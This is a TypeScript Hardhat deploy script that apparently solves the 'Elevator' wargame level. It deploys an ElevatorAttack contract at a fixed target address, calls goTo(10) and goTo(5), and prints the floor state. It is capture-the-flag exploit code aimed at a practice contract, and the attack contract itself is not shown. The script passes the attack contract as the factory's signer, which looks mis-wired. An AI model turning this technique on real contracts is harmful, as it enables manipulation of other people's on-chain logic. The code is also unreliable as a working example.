import { HardhatRuntimeEnvironment } from 'hardhat/types';
import { DeployFunction } from 'hardhat-deploy/types';
import { ethers } from 'hardhat';
import { Elevator__factory,ElevatorAttack__factory } from '../../typechain-types';

const func:DeployFunction = async function (hre: HardhatRuntimeEnvironment){
    const elevatorAddress = "0xCFA713dA028aB68c164EC342288f5AA1a52b6190";

    console.log(">> Deploy ElevatorAttack Contract");
    const ElevatorAttack = await ethers.getContractFactory("ElevatorAttack",(await ethers.getSigners())[0]) as ElevatorAttack__factory;
    const elevatorAttack = await ElevatorAttack.deploy(elevatorAddress);
    await elevatorAttack.deployed();
    console.log(">> Attach Elevator Contract");
    const Elevator = await ethers.getContractFactory("Elevator",elevatorAttack) as Elevator__factory;
    const elevator = await Elevator.attach(elevatorAddress);
    const goto10 = await elevator.goTo(10);
    await goto10.wait();
    console.log(">> floor 10 top:",await elevator.top());
    console.log(">> floor 10:",await elevator.floor());
    const goto5 = await elevator.goTo(5);
    await goto5.wait();
    console.log(">> floor 5 top:",await elevator.top());
    console.log(">> floor 5:",await elevator.floor());
    
    console.log("✅ Done");
}

export default func;
func.tags = ['Elevator'];